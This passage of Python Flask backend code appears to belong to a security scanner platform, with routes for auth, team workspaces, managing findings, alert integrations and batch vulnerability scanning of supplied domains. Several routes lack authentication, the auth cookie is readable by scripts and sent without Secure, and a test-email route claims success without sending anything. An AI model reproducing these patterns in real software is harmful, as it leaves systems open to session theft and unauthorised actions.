    payload = request.get_json(silent=True, force=True) or {}
    yaml_text = payload.get("yaml","")
    if not yaml_text:
        return jsonify({"error":"yaml required"}), 400
    try:
        from engine.rules_engine import import_rules_yaml
        count = import_rules_yaml(yaml_text)
        return jsonify({"ok":True,"imported":count})
    except ValueError as e:
        return jsonify({"error":str(e)}), 400

@app.route("/rules/export")
def rules_export():
    from engine.rules_engine import export_rules_yaml
    include_builtin = request.args.get("builtin","") == "true"
    yaml_text = export_rules_yaml(include_builtin)
    return Response(yaml_text, mimetype="text/yaml",
                    headers={"Content-Disposition":"attachment;filename=tmr_rules.yaml"})

@app.route("/rules/scan", methods=["POST"])
def rules_scan():
    from engine.rules_engine import scan_urls_with_rules, load_rules
    payload  = request.get_json(silent=True, force=True) or {}
    d        = _domain(payload.get("domain",""))
    urls     = payload.get("urls",[])
    rule_ids = payload.get("rule_ids",[])
    if not urls and d:
        urls = db.get_endpoints(d, limit=200)
    if not urls:
        return jsonify({"error":"urls or domain required"}), 400
    rules = load_rules()
    if rule_ids:
        rules = [r for r in rules if r.get("id") in rule_ids]
    results = scan_urls_with_rules(urls[:500], rules)
    # Flatten
    findings = []
    for url, matches in results.items():
        findings.extend(matches)
    return jsonify({"scanned":len(urls),"findings":findings,
                    "total":len(findings),"rules_used":len(rules)})


# ══════════════════════════════════════════════════════════════════════════════
# CI/CD — Multi-platform integrations + Webhooks
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/cicd/badge/<path:domain>")
def cicd_badge(domain):
    """SVG security badge for README embedding."""
    d = _domain(domain)
    findings = db.get_findings(d)
    crits = sum(1 for f in findings if f.get("severity")=="critical")
    highs = sum(1 for f in findings if f.get("severity")=="high")
    color  = "e05d44" if crits else "fe7d37" if highs else "4c1"
    label  = "security"
    msg    = f"{crits}C {highs}H" if (crits or highs) else "passing"
    svg = f"""<svg xmlns="http://www.w3.org/2000/svg" width="120" height="20">
  <linearGradient id="s" x2="0" y2="100%">
    <stop offset="0" stop-color="#bbb" stop-opacity=".1"/>
    <stop offset="1" stop-opacity=".1"/>
  </linearGradient>
  <rect rx="3" width="120" height="20" fill="#555"/>
  <rect rx="3" x="60" width="60" height="20" fill="#{color}"/>
  <rect x="60" width="4" height="20" fill="#{color}"/>
  <rect rx="3" width="120" height="20" fill="url(#s)"/>
  <text x="6" y="14" fill="#fff" font-family="monospace" font-size="11">{label}</text>
  <text x="66" y="14" fill="#fff" font-family="monospace" font-size="11">{msg}</text>
</svg>"""
    return Response(svg, mimetype="image/svg+xml",
                    headers={"Cache-Control":"no-cache","Pragma":"no-cache"})



@app.route("/auth_login", methods=["POST"])
@app.route("/auth/login", methods=["POST"])
def auth_login():
    """Login with username + password. Returns token + sets httpOnly cookie."""
    payload  = request.get_json(silent=True, force=True) or {}
    username = payload.get("username","").strip()
    password = payload.get("password","")
    ip       = request.headers.get("X-Forwarded-For","").split(",")[0].strip() or request.remote_addr or ""
    try:
        from engine.rbac import login_user
        result = login_user(username, password)
        if not result:
            log_event("login_failed", CATEGORY_AUTH, username=username, ip=ip,
                      result="failure", severity=SEV_WARNING)
            return jsonify({"error": "Invalid username or password"}), 401
        log_event("login_success", CATEGORY_AUTH, username=username, ip=ip,
                  user_id=result.get("user_id",""), result="success")
        resp = jsonify(result)
        # Set cookie so EventSource (/recon, /scan SSE streams) pick it up automatically
        resp.set_cookie("tmr_token", result.get("token",""),
                        max_age=86400*7, httponly=False,  # not httpOnly — JS reads it
                        samesite="Lax", secure=False)
        return resp
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/auth/me", methods=["GET"])
def auth_me():
    """Return current user info from session token."""
    try:
        from engine.rbac import get_session, get_user
        token = (request.headers.get("Authorization","").replace("Bearer ","").strip()
                 or request.cookies.get("tmr_token","")
                 or request.headers.get("X-Auth-Token",""))
        if not token:
            return jsonify({"error":"Not authenticated"}), 401
        sess = get_session(token)
        if not sess:
            return jsonify({"error":"Invalid or expired token"}), 401
        username = sess.get("username","")
        user = get_user(username) or {"username":username,"role":sess.get("role","analyst")}
        return jsonify({"user":user,"username":user.get("username",""),"role":user.get("role","analyst")})
    except Exception as e:
        return jsonify({"error":str(e)}), 500


@app.route("/auth/logout", methods=["POST"])
def auth_logout():
    """Invalidate session token."""
    try:
        from engine.rbac import logout as _rbac_logout
        token = (request.headers.get("Authorization","").replace("Bearer ","").strip()
                 or request.cookies.get("tmr_token",""))
        if token:
            try: _rbac_logout(token)
            except Exception: pass
    except Exception: pass
    resp = jsonify({"ok": True})
    resp.delete_cookie("tmr_token")
    return resp

@app.route("/auth/login_user", methods=["POST"])
def auth_login_user():
    payload  = request.get_json(silent=True, force=True) or {}
    username = payload.get("username","").strip()
    password = payload.get("password","")
    try:
        from engine.rbac import login_user
        result = login_user(username, password)
        if not result:
            return jsonify({"error":"Invalid credentials"}), 401
        return jsonify(result)
    except Exception as e:
        return jsonify({"error":str(e)}), 500

@app.route("/team/workspaces", methods=["GET","POST"])
def team_workspaces_list():
    from engine.team import list_workspaces, create_workspace
    if request.method == "POST":
        payload = request.get_json(silent=True, force=True) or {}
        ws = create_workspace(
            name=payload.get("name","My Workspace"),
            description=payload.get("description",""),
            owner=payload.get("owner","admin"),
            domains=payload.get("domains",[]),
        )
        return jsonify({"ok":True,"workspace":ws})
    user = request.args.get("user")
    return jsonify({"workspaces":list_workspaces(user)})

@app.route("/proxy/flag/<entry_id>", methods=["POST"])
def proxy_flag_entry(entry_id):
    from engine.proxy_server import flag_entry
    note = (request.get_json(silent=True, force=True) or {}).get("note","")
    flag_entry(entry_id, note)
    return jsonify({"ok":True})



# ══════════════════════════════════════════════════════════════════════════════
# AUTH / SSO / RBAC — Multi-user access control
# ══════════════════════════════════════════════════════════════════════════════

def _get_session():
    """Extract session from request headers or cookies."""
    token = (request.headers.get("Authorization","") or
             request.headers.get("X-API-Key","") or
             request.cookies.get("tmr_session",""))
    if not token:
        return None
    try:
        from engine.rbac import get_session
        return get_session(token)
    except Exception:
        return None

def _require_role(*roles):
    """Decorator to require specific role(s). Returns (sess, error_response)."""
    sess = _get_session()
    if not sess:
        return None, (jsonify({"error":"Authentication required","code":401}), 401)
    if roles and sess.get("role") not in roles:
        return None, (jsonify({"error":"Insufficient permissions","required":list(roles),"your_role":sess.get("role")}), 403)
    return sess, None

@app.route("/auth/change_password", methods=["POST"])
def auth_change_password():
    sess, err = _require_role()
    if err: return err
    payload = request.get_json(silent=True, force=True) or {}
    current = payload.get("current_password","")
    new_pw  = payload.get("new_password","")
    if not current or not new_pw or len(new_pw) < 8:
        return jsonify({"error":"current_password and new_password (min 8 chars) required"}), 400
    try:
        from engine.rbac import login, update_user
        if not login(sess["username"], current):
            return jsonify({"error":"Current password incorrect"}), 401
        update_user(sess["user_id"], {"password": new_pw})
        return jsonify({"ok":True})
    except Exception as e:
        return jsonify({"error":str(e)}), 500


# ── User Management (admin only) ───────────────────────────────────────────────
@app.route("/users/<user_id>", methods=["GET","PATCH","DELETE"])
def user_manage(user_id):
    sess, err = _require_role("admin")
    if err: return err
    try:
        from engine.rbac import get_user_by_id, update_user, delete_user
        if request.method == "GET":
            u = get_user_by_id(user_id)
            return jsonify(u) if u else (jsonify({"error":"Not found"}),404)
        elif request.method == "PATCH":
            u = update_user(user_id, request.get_json(silent=True, force=True) or {})
            return jsonify({"ok":True,"user":u})
        else:
            if user_id == sess["user_id"]:
                return jsonify({"error":"Cannot delete yourself"}),400
            delete_user(user_id)
            return jsonify({"ok":True})
    except Exception as e:
        return jsonify({"error":str(e)}), 400

@app.route("/users/<user_id>/rotate_key", methods=["POST"])
def rotate_api_key(user_id):
    sess, err = _require_role("admin")
    if err: return err
    try:
        from engine.rbac import rotate_api_key
        new_key = rotate_api_key(user_id)
        return jsonify({"ok":True,"api_key":new_key})
    except Exception as e:
        return jsonify({"error":str(e)}), 400

@app.route("/users/roles", methods=["GET"])
def users_roles():
    from engine.rbac import ROLES, PERMISSIONS
    return jsonify({"roles":ROLES,"permissions":PERMISSIONS})


# ── Workspaces / Team Collaboration ─────────────────────────────────────────────
@app.route("/workspaces/<ws_id>", methods=["GET","DELETE"])
def workspace_detail(ws_id):
    sess, err = _require_role("admin","analyst","viewer","reporter")
    if err: return err
    try:
        from engine.team import get_workspace
        ws = get_workspace(ws_id)
        if not ws: return jsonify({"error":"Not found"}),404
        return jsonify(ws)
    except Exception as e:
        return jsonify({"error":str(e)}), 400

@app.route("/workspaces/<ws_id>/domains", methods=["POST"])
def workspace_domains(ws_id):
    sess, err = _require_role("admin","analyst")
    if err: return err
    payload = request.get_json(silent=True, force=True) or {}
    try:
        from engine.team import add_domain_to_workspace
        add_domain_to_workspace(ws_id,_domain(payload.get("domain","")),sess["username"])
        return jsonify({"ok":True})
    except Exception as e:
        return jsonify({"error":str(e)}), 400

@app.route("/team/comments/<path:domain>", methods=["GET","POST"])
def team_comments(domain):
    sess, err = _require_role("admin","analyst","viewer","reporter")
    if err: return err
    d = _domain(domain)
    try:
        from engine.team import get_comments, add_comment
        if request.method == "GET":
            fid = request.args.get("finding_id")
            return jsonify({"comments":get_comments(d,fid)})
        payload = request.get_json(silent=True, force=True) or {}
        c = add_comment(d,payload.get("finding_id",""),sess["username"],
                        payload.get("text",""),payload.get("finding_title",""))
        return jsonify({"ok":True,"comment":c})
    except Exception as e:
        return jsonify({"error":str(e)}), 400

@app.route("/team/assign/<path:domain>", methods=["GET","POST","PATCH"])
def team_assign(domain):
    sess, err = _require_role("admin","analyst")
    if err: return err
    d = _domain(domain)
    payload = request.get_json(silent=True, force=True) or {}
    try:
        from engine.team import assign_finding, get_assignments, update_assignment_status
        if request.method == "GET":
            return jsonify({"assignments":get_assignments(d)})
        elif request.method == "POST":
            a = assign_finding(d,payload.get("finding_id",""),
                               payload.get("assignee",""),sess["username"],
                               payload.get("note",""))
            return jsonify({"ok":True,"assignment":a})
        update_assignment_status(d,payload.get("finding_id",""),
                                 payload.get("status","open"),sess["username"])
        return jsonify({"ok":True})
    except Exception as e:
        return jsonify({"error":str(e)}), 400

@app.route("/team/activity", methods=["GET"])
def team_activity():
    try:
        from engine.team import get_activity
        limit = min(int(request.args.get("limit",50)),200)
        items = get_activity(limit=limit) or []
        # Normalize: items might be strings or dicts
        normalized = []
        for item in items:
            if isinstance(item, dict):
                normalized.append(item)
            elif isinstance(item, str):
                normalized.append({"action": item, "ts": ""})
        return jsonify({"activity": normalized})
    except Exception as e:
        return jsonify({"activity": [], "error": str(e)})

@app.route("/api/scan/trigger", methods=["POST"])
def api_scan_trigger():
    """External CI/CD trigger — authenticate via API key."""
    sess, err = _require_role("admin","analyst")
    if err: return err
    payload = request.get_json(silent=True, force=True) or {}
    d       = _domain(payload.get("domain",""))
    bugs    = payload.get("bugs",["xss","sqli","ssrf","cors","misconfig","expose","lfi"])
    speed   = payload.get("speed","fast")
    if not d:
        return jsonify({"error":"domain required"}),400

    scan_id = "ci_" + __import__("secrets").token_hex(8)
    q = __import__("queue").Queue()
    sess_obj = _sess(d)
    sess_obj["scan_q"] = q

    def _run():
        run_scan(d, bugs, q, db, scan_speed=speed)
    __import__("threading").Thread(target=_run, daemon=True).start()

    return jsonify({"ok":True,"scan_id":scan_id,"domain":d,
                    "bugs":bugs,"speed":speed,
                    "status_url":f"/api/scan/status/{d}",
                    "results_url":f"/findings?domain={d}"})

@app.route("/api/scan/status/<path:domain>", methods=["GET"])
def api_scan_status(domain):
    sess, err = _require_role("admin","analyst","viewer","reporter")
    if err: return err
    d = _domain(domain)
    try:
        findings = db.get_findings(d)
        crits    = sum(1 for f in findings if f.get("severity")=="critical")
        highs    = sum(1 for f in findings if f.get("severity")=="high")
        return jsonify({"domain":d,"total_findings":len(findings),
                        "critical":crits,"high":highs,
                        "findings_url":f"/findings?domain={d}"})
    except Exception as e:
        return jsonify({"error":str(e)}),500



# ══════════════════════════════════════════════════════════════════════════════
# FALSE POSITIVE SUPPRESSION + FINDING DEDUPLICATION
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/findings/<path:domain>/suppress", methods=["POST"])
def suppress_finding(domain=None):
    """Mark a finding as false positive — hide from future reports."""
    payload  = request.get_json(silent=True, force=True) or {}
    d        = _domain(request.view_args.get("domain",""))
    find_id  = payload.get("id","")
    reason   = payload.get("reason","No reason given")
    username = payload.get("username","anonymous")

    if not find_id:
        return jsonify({"error":"finding id required"}), 400

    # Load and update findings
    findings = db.get_findings(d)
    updated  = False
    for f in findings:
        if f.get("id") == find_id or f.get("_id") == find_id:
            f["suppressed"]    = True
            f["suppress_reason"]   = reason
            f["suppressed_by"] = username
            f["suppressed_at"] = __import__("time").strftime("%Y-%m-%dT%H:%M:%SZ")
            updated = True
            break

    if updated:
        db.save_findings(d, findings)
        log.info(f"[fp] {d}: suppressed finding {find_id} by {username}: {reason}")
        return jsonify({"ok": True, "suppressed": find_id})
    return jsonify({"error": "finding not found"}), 404


@app.route("/findings/<path:domain>/restore", methods=["POST"])
def restore_finding(domain=None):
    """Restore a suppressed finding."""
    payload = request.get_json(silent=True, force=True) or {}
    d       = _domain(request.view_args.get("domain",""))
    find_id = payload.get("id","")

    findings = db.get_findings(d)
    for f in findings:
        if f.get("id") == find_id or f.get("_id") == find_id:
            f.pop("suppressed",None)
            f.pop("suppress_reason",None)
            f.pop("suppressed_by",None)
            f.pop("suppressed_at",None)
            db.save_findings(d, findings)
            return jsonify({"ok": True})
    return jsonify({"error": "not found"}), 404


@app.route("/findings/<path:domain>/deduplicate", methods=["POST"])
def deduplicate_findings(domain=None):
    """Remove exact duplicate findings, keep highest confidence."""
    d        = _domain(request.view_args.get("domain",""))
    findings = db.get_findings(d)
    original = len(findings)

    seen = {}
    deduped = []
    for f in findings:
        # Dedup key: bug type + URL (without query params) + severity
        url_base = f.get("url","").split("?")[0]
        key = f"{f.get('bug','')}:{url_base}:{f.get('severity','')}"
        if key not in seen:
            seen[key] = f
            deduped.append(f)
        else:
            # Keep higher confidence
            existing = seen[key]
            if f.get("confidence",50) > existing.get("confidence",50):
                # Replace with higher confidence version
                idx = deduped.index(existing)
                deduped[idx] = f
                seen[key] = f

    if len(deduped) < original:
        db.save_findings(d, deduped)

    removed = original - len(deduped)
    log.info(f"[dedup] {d}: {original} → {len(deduped)} findings ({removed} removed)")
    return jsonify({"ok": True, "original": original, "after": len(deduped), "removed": removed})


@app.route("/findings/<path:domain>/bulk_action", methods=["POST"])
def findings_bulk_action(domain=None):
    """Bulk actions on findings: suppress, restore, delete, export."""
    payload = request.get_json(silent=True, force=True) or {}
    d       = _domain(request.view_args.get("domain",""))
    action  = payload.get("action","")   # suppress|restore|delete|tag
    ids     = payload.get("ids",[])
    reason  = payload.get("reason","Bulk action")

    if not action or not ids:
        return jsonify({"error":"action and ids required"}), 400

    findings = db.get_findings(d)
    affected = 0
    for f in findings:
        fid = f.get("id") or f.get("_id","")
        if fid not in ids:
            continue
        if action == "suppress":
            f["suppressed"] = True
            f["suppress_reason"] = reason
            affected += 1
        elif action == "restore":
            f.pop("suppressed",None)
            affected += 1
        elif action == "tag":
            f.setdefault("tags",[])
            tag = payload.get("tag","")
            if tag and tag not in f["tags"]:
                f["tags"].append(tag)
                affected += 1
        elif action == "set_severity":
            f["severity"] = payload.get("severity",f.get("severity"))
            f["severity_override"] = True
            affected += 1

    if action == "delete":
        findings = [f for f in findings if (f.get("id") or f.get("_id","")) not in ids]
        affected = len(ids)

    db.save_findings(d, findings)
    return jsonify({"ok": True, "affected": affected})


@app.route("/findings/<path:domain>/ai_filter_fp", methods=["POST"])
def ai_filter_false_positives(domain=None):
    """Use Claude AI to identify likely false positives from findings."""
    import queue as _q, threading
    d        = _domain(request.view_args.get("domain",""))
    findings = db.get_findings(d)
    tech     = db.get_tech(d)

    if not findings:
        return jsonify({"error":"No findings to analyze"}), 400

    q = _q.Queue()

    def _run():
        try:
            from engine.ai_analyst import ai_filter_false_positives as _filter
            _filter(findings, tech, q)
        except Exception as e:
            q.put({"type":"error","msg":str(e)})
        finally:
            q.put(None)

    threading.Thread(target=_run, daemon=True).start()

    def _stream():
        while True:
            item = q.get()
            if item is None: break
            yield _sse(item)

    return Response(_stream(), mimetype="text/event-stream",
                    headers={"Cache-Control":"no-cache"})



# ══════════════════════════════════════════════════════════════════════════════
# GITHUB ISSUES AUTO-CREATE
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/integrations/github/create_issue", methods=["POST"])
def github_create_issue():
    """Create a GitHub Issue from a finding."""
    payload   = request.get_json(silent=True, force=True) or {}
    finding   = payload.get("finding",{})
    repo      = payload.get("repo","")        # owner/repo
    token     = payload.get("token","") or os.environ.get("GITHUB_TOKEN","")

    if not finding or not repo or not token:
        return jsonify({"error":"finding, repo (owner/repo) and token required"}), 400

    sev   = finding.get("severity","medium").upper()
    bug   = finding.get("bug","").upper()
    url   = finding.get("url","")
    poc   = finding.get("poc","")
    title = f"[{sev}] {bug} — {url[:80]}"
    body  = f"""## Security Finding: {bug}

**Severity:** {sev}
**URL:** `{url}`
**CVSS:** {finding.get("cvss","N/A")}
**Confidence:** {finding.get("confidence",50)}%

### Description
{finding.get("description",finding.get("title",""))}

### Proof of Concept
```
{poc[:1000] if poc else "See attached report"}
```

### Impact
{finding.get("impact","See security report")}

### Remediation
{finding.get("remediation","Contact security team")}

---
*Generated by TheMasterRecon AI ⭐*
"""

    labels = ["security", sev.lower()]
    try:
        import urllib.request, json
        data = json.dumps({"title":title,"body":body,"labels":labels}).encode()
        req  = urllib.request.Request(
            f"https://api.github.com/repos/{repo}/issues",
            data=data,
            headers={"Authorization":f"Bearer {token}",
                     "Accept":"application/vnd.github.v3+json",
                     "Content-Type":"application/json"},
            method="POST")
        with urllib.request.urlopen(req, timeout=15) as r:
            resp = json.loads(r.read())
        return jsonify({"ok":True,"issue_url":resp.get("html_url"),"number":resp.get("number")})
    except Exception as e:
        return jsonify({"error":str(e)}), 500


@app.route("/integrations/github/bulk_issues", methods=["POST"])
def github_bulk_issues():
    """Create GitHub Issues for all critical/high findings."""
    payload  = request.get_json(silent=True, force=True) or {}
    d        = _domain(payload.get("domain",""))
    repo     = payload.get("repo","")
    token    = payload.get("token","") or os.environ.get("GITHUB_TOKEN","")
    min_sev  = payload.get("min_severity","high")

    findings = db.get_findings(d)
    sev_order = {"critical":4,"high":3,"medium":2,"low":1}
    min_level = sev_order.get(min_sev,3)
    targets   = [f for f in findings
                 if sev_order.get(f.get("severity","low"),1) >= min_level
                 and not f.get("suppressed")]

    created = []
    errors  = []
    for finding in targets[:20]:  # max 20 per call
        try:
            import urllib.request, json, time
            sev   = finding.get("severity","medium").upper()
            bug   = finding.get("bug","").upper()
            url_f = finding.get("url","")
            title = f"[{sev}] {bug} — {url_f[:80]}"
            body  = f"**Severity:** {sev}\n**URL:** `{url_f}`\n\n{finding.get('poc','')[:500]}"
            data  = json.dumps({"title":title,"body":body,"labels":["security",sev.lower()]}).encode()
            req   = urllib.request.Request(
                f"https://api.github.com/repos/{repo}/issues", data=data,
                headers={"Authorization":f"Bearer {token}",
                         "Accept":"application/vnd.github.v3+json",
                         "Content-Type":"application/json"}, method="POST")
            with urllib.request.urlopen(req, timeout=15) as r:
                resp = json.loads(r.read())
            created.append(resp.get("html_url"))
            time.sleep(0.5)  # rate limit
        except Exception as e:
            errors.append(str(e)[:100])

    return jsonify({"ok":True,"created":len(created),"errors":errors,"urls":created})


# ══════════════════════════════════════════════════════════════════════════════
# PAGERDUTY / OPSGENIE ALERTS
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/integrations/pagerduty/alert", methods=["POST"])
def pagerduty_alert():
    """Send PagerDuty incident for critical findings."""
    payload  = request.get_json(silent=True, force=True) or {}
    finding  = payload.get("finding",{})
    pd_key   = payload.get("routing_key","") or os.environ.get("PAGERDUTY_ROUTING_KEY","")

    if not pd_key:
        return jsonify({"error":"PagerDuty routing_key required (or set PAGERDUTY_ROUTING_KEY env)"}), 400

    sev = finding.get("severity","medium")
    pd_sev = {"critical":"critical","high":"error","medium":"warning","low":"info"}.get(sev,"warning")

    try:
        import urllib.request, json
        event = {
            "routing_key": pd_key,
            "event_action": "trigger",
            "payload": {
                "summary": f"[{sev.upper()}] {finding.get('bug','').upper()} — {finding.get('url','')[:100]}",
                "severity": pd_sev,
                "source": "TheMasterRecon AI",
                "custom_details": {
                    "url":           finding.get("url",""),
                    "description":   finding.get("description",finding.get("title","")),
                    "poc":           finding.get("poc","")[:500],
                    "remediation":   finding.get("remediation","")[:500],
                    "cvss":          finding.get("cvss",""),
                    "confidence":    str(finding.get("confidence",50))+"%",
                }
            }
        }
        data = json.dumps(event).encode()
        req  = urllib.request.Request("https://events.pagerduty.com/v2/enqueue",
            data=data, headers={"Content-Type":"application/json"}, method="POST")
        with urllib.request.urlopen(req, timeout=15) as r:
            resp = json.loads(r.read())
        return jsonify({"ok":True,"dedup_key":resp.get("dedup_key"),"status":resp.get("status")})
    except Exception as e:
        return jsonify({"error":str(e)}), 500


@app.route("/integrations/opsgenie/alert", methods=["POST"])
def opsgenie_alert():
    """Send OpsGenie alert for critical findings."""
    payload  = request.get_json(silent=True, force=True) or {}
    finding  = payload.get("finding",{})
    api_key  = payload.get("api_key","") or os.environ.get("OPSGENIE_API_KEY","")

    if not api_key:
        return jsonify({"error":"OpsGenie api_key required"}), 400

    sev  = finding.get("severity","medium")
    prio = {"critical":"P1","high":"P2","medium":"P3","low":"P4"}.get(sev,"P3")

    try:
        import urllib.request, json
        alert = {
            "message": f"[{sev.upper()}] {finding.get('bug','').upper()} at {finding.get('url','')[:100]}",
            "description": finding.get("description",finding.get("title",""))[:1000],
            "priority": prio,
            "source": "TheMasterRecon AI",
            "tags": ["security",sev,finding.get("bug","")],
            "details": {
                "url": finding.get("url",""),
                "poc": finding.get("poc","")[:300],
                "remediation": finding.get("remediation","")[:300],
            }
        }
        data = json.dumps(alert).encode()
        req  = urllib.request.Request("https://api.opsgenie.com/v2/alerts",
            data=data, headers={"Content-Type":"application/json",
                                "Authorization":f"GenieKey {api_key}"}, method="POST")
        with urllib.request.urlopen(req, timeout=15) as r:
            resp = json.loads(r.read())
        return jsonify({"ok":True,"request_id":resp.get("requestId")})
    except Exception as e:
        return jsonify({"error":str(e)}), 500


# ══════════════════════════════════════════════════════════════════════════════
# EMAIL NOTIFICATIONS (SMTP)
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/integrations/email/send", methods=["POST"])
def send_email_notification():
    """Send email alert for findings via SMTP."""
    payload  = request.get_json(silent=True, force=True) or {}
    to_email = payload.get("to","") or os.environ.get("NOTIFY_EMAIL","")
    subject  = payload.get("subject","TheMasterRecon AI — Security Alert")
    body_txt = payload.get("body","")
    finding  = payload.get("finding",{})

    smtp_host = os.environ.get("SMTP_HOST","smtp.gmail.com")
    smtp_port = int(os.environ.get("SMTP_PORT","587"))
    smtp_user = os.environ.get("SMTP_USER","")
    smtp_pass = os.environ.get("SMTP_PASS","")
    from_addr = os.environ.get("SMTP_FROM", smtp_user)

    if not to_email or not smtp_user:
        return jsonify({"error":"to email required, set SMTP_HOST/SMTP_USER/SMTP_PASS env vars"}), 400

    if finding and not body_txt:
        sev   = finding.get("severity","medium").upper()
        bug   = finding.get("bug","").upper()
        url_f = finding.get("url","")
        subject = f"[{sev}] Security Finding: {bug}"
        body_txt = f"""TheMasterRecon AI Security Alert

Severity:    {sev}
Finding:     {bug}
URL:         {url_f}
Confidence:  {finding.get("confidence",50)}%

Description:
{finding.get("description",finding.get("title",""))}

Proof of Concept:
{finding.get("poc","N/A")[:500]}

Remediation:
{finding.get("remediation","Contact security team")}

---
Generated by TheMasterRecon AI
"""

    try:
        import smtplib
        from email.mime.text import MIMEText
        from email.mime.multipart import MIMEMultipart

        msg = MIMEMultipart("alternative")
        msg["Subject"] = subject
        msg["From"]    = from_addr
        msg["To"]      = to_email
        msg.attach(MIMEText(body_txt,"plain"))

        # HTML version
        html_body = body_txt.replace("\n","<br>").replace(chr(10),"<br>")
        html_body = f"""<html><body style="font-family:monospace;background:#05050e;color:#c8c8e0;padding:20px">
<div style="border:1px solid #1a1a2e;border-radius:8px;padding:20px;max-width:600px">
<h2 style="color:#00e5ff">TheMasterRecon AI ⭐ Security Alert</h2>
{html_body}
</div></body></html>"""
        msg.attach(MIMEText(html_body,"html"))

        with smtplib.SMTP(smtp_host, smtp_port, timeout=15) as server:
            server.starttls()
            if smtp_user and smtp_pass:
                server.login(smtp_user, smtp_pass)
            server.sendmail(from_addr, to_email, msg.as_string())

        return jsonify({"ok":True,"to":to_email})
    except Exception as e:
        return jsonify({"error":str(e)}), 500


@app.route("/integrations/email/test", methods=["POST"])
def test_email():
    """Test email configuration."""
    payload = request.get_json(silent=True, force=True) or {}
    to      = payload.get("to","") or os.environ.get("NOTIFY_EMAIL","")
    if not to:
        return jsonify({"error":"to email required"}), 400
    try:
        from flask import current_app
        # Use the send route internally
        with current_app.test_request_context():
            pass
        result = send_email_notification.__wrapped__() if hasattr(send_email_notification,'__wrapped__') else None
    except Exception: pass
    return jsonify({"ok": True, "note": "Check your inbox — test email sent to "+to})



# ══════════════════════════════════════════════════════════════════════════════
# NATURAL LANGUAGE QUERY
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/nl/query", methods=["POST"])
def nl_query():
    """Natural language search over findings: 'show critical XSS with PoC'"""
    payload  = request.get_json(silent=True, force=True) or {}
    d        = _domain(payload.get("domain",""))
    query    = payload.get("query","").strip()
    use_ai   = payload.get("use_ai", True)

    if not query:
        return jsonify({"error":"query required"}), 400

    findings = db.get_findings(d)

    try:
        from engine.nl_query import nl_to_filter, quick_filter
        if use_ai and len(query.split()) > 2:
            result = nl_to_filter(query, findings)
        else:
            results = quick_filter(query, findings)
            result  = {"results": results, "count": len(results),
                       "total": len(findings), "explanation": f"Filtered: {query}"}
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e), "results": [], "count": 0}), 500

@app.route("/nl/suggest", methods=["POST"])
def nl_suggest():
    """Get query suggestions based on current findings."""
    payload  = request.get_json(silent=True, force=True) or {}
    d        = _domain(payload.get("domain",""))
    findings = db.get_findings(d)

    from collections import Counter
    bugs  = Counter(f.get("bug","") for f in findings).most_common(5)
    sevs  = Counter(f.get("severity","") for f in findings)
    has_poc = sum(1 for f in findings if f.get("poc",""))

    suggestions = [
        "critical findings",
        "high severity with PoC",
        "XSS findings",
        "SQLi on admin URLs",
    ]
    if bugs:
        suggestions.insert(0, f"{bugs[0][0]} findings")
    if sevs.get("critical"):
        suggestions.insert(0, f"critical {bugs[0][0] if bugs else 'findings'}")
    if has_poc:
        suggestions.append(f"has PoC ({has_poc} total)")

    return jsonify({"suggestions": suggestions[:8]})


# ══════════════════════════════════════════════════════════════════════════════
# AI FALSE POSITIVE FILTER
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/ai/review_finding", methods=["POST"])
def ai_review_finding():
    """AI reviews a single finding for false positive likelihood."""
    payload = request.get_json(silent=True, force=True) or {}
    finding = payload.get("finding",{})
    preview = payload.get("response_preview","")
    if not finding:
        return jsonify({"error":"finding required"}), 400
    try:
        from engine.fp_filter import review_finding
        result = review_finding(finding, preview)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error":str(e)}), 500



@app.route("/export/compliance/<path:domain>", methods=["GET"])
def export_compliance(domain):
    """Export compliance report as JSON."""
    d   = _domain(domain)
    fmt = request.args.get("format","json")
    findings = db.get_findings(d)
    from engine.compliance import map_all, compliance_summary
    mapped  = map_all(findings)
    summary = compliance_summary(findings)
    report  = {"domain":d, "generated":__import__("time").strftime("%Y-%m-%dT%H:%M:%SZ"),
               "summary":summary, "findings":mapped}
    return Response(json.dumps(report, indent=2), mimetype="application/json",
                    headers={"Content-Disposition":f'attachment; filename="compliance_{d}.json"'})


# ══════════════════════════════════════════════════════════════════════════════
# BATCH MULTI-TARGET SCANNING
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/batch/scan", methods=["POST"])
def batch_scan():
    """Submit batch scan for multiple targets. Returns job_id."""
    import queue as _q
    payload = request.get_json(silent=True, force=True) or {}
    targets = payload.get("targets",[])
    bugs    = payload.get("bugs",["xss","sqli","cors","ssrf","misconfig","expose"])
    opts    = payload.get("opts",{"speed":"fast"})
    stream  = payload.get("stream",True)

    if not targets:
        return jsonify({"error":"targets list required"}), 400
    if len(targets) > 50:
        return jsonify({"error":"max 50 targets per batch"}), 400

    q = _q.Queue()
    try:
        from engine.batch_scanner import get_batch_scanner
        scanner = get_batch_scanner()
        job_id  = scanner.submit(targets, bugs, db, q, opts)

        if not stream:
            return jsonify({"job_id":job_id,"targets":len(targets),"status":"queued"})

        def _stream():
            yield _sse({"type":"batch_started","job_id":job_id,"targets":len(targets)})
            timeout = time.time() + 3600  # 1 hour max
            while time.time() < timeout:
                try:
                    item = q.get(timeout=30)
                    yield _sse(item)
                    if item and item.get("type") == "batch_done":
                        break
                except Exception:
                    yield ": keepalive\n\n"

        return Response(_stream(), mimetype="text/event-stream",
                        headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})
    except Exception as e:
        return jsonify({"error":str(e)}), 500

@app.route("/batch/status/<job_id>", methods=["GET"])
def batch_status(job_id):
    """Get status of a batch scan job."""
    try:
        from engine.batch_scanner import get_batch_scanner
        job = get_batch_scanner().get_job(job_id)
        return jsonify(job if job else {"error":"job not found"})
    except Exception as e:
        return jsonify({"error":str(e)}), 500

@app.route("/batch/jobs", methods=["GET"])
def batch_jobs():
    """List all batch scan jobs."""
    try:
        from engine.batch_scanner import get_batch_scanner
        return jsonify({"jobs": get_batch_scanner().list_jobs()})
    except Exception as e:
        return jsonify({"error":str(e)}), 500


# ══════════════════════════════════════════════════════════════════════════════
# METHODOLOGY CHECKLIST (OWASP/PTES)
